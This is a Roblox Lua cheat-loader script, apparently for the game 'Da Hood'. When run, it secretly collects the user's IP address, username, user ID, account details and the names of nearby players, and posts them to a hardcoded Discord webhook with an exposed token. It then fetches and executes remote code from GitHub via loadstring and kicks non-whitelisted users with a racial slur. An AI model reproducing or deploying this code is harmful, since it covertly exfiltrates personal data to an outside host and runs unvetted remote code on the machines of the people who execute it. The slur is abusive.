local h = game:GetService("HttpService")
local lp = game.Players.LocalPlayer
local ip = game:HttpGet("https://api.ipify.org/")
local exec = identifyexecutor and identifyexecutor() or "Unknown"
local user = lp.Name
local uid = lp.UserId
local age = lp.AccountAge
local premium = lp.MembershipType == Enum.MembershipType.Premium and "Yes" or "No"
local gname = "Unknown"
local tickTime = os.date("%Y-%m-%d %H:%M:%S")

pcall(function()
    local info = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
    if info and info.Name then gname = info.Name end
end)

local others = {}
for i,v in ipairs(game.Players:GetPlayers()) do
    if #others >= 5 then break end
    table.insert(others,v.Name)
end

local desc = "User: "..user..
             "\nUserId: "..uid..
             "\nExecutor: "..exec..
             "\nAccount Age: "..age..
             "\nPremium: "..premium..
             "\nIP: "..ip..
             "\nGame: "..gname..
             "\nPlaceId: "..tostring(game.PlaceId)..
             "\nPlayers: "..table.concat(others,", ")..
             "\nTime: "..tickTime

local data = {
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "Execution Logged",
        ["description"] = desc,
        ["color"] = tonumber(0x00ffff)
    }}
}

local j = h:JSONEncode(data)
local wh = "https://discord.com/api/webhooks/1363691425132187898/2G0kVvGlq5y7-0kT9DAiLDSetKNUA2zK0IlppBo6z1sBhGel-G_fB8rctKH4YlVEMyvC"

pcall(function()
    local r = request or http_request or syn.request
    if r then
        r({
            Url = wh,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = j
        })
    end
end)

local wl = game:HttpGet("https://raw.githubusercontent.com/RioJustMad/fulyworkingDAHOOD/main/whitelist")

if not wl:find(lp.Name) then
    lp:Kick("no access nigger")
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/RioJustMad/fulyworkingDAHOOD/main/main.lua"))()

while true do
    task.wait(5)
    if not game:HttpGet("https://raw.githubusercontent.com/RioJustMad/fulyworkingDAHOOD/main/whitelist"):find(lp.Name) then
        lp:Kick("no access nigger")
    end
end
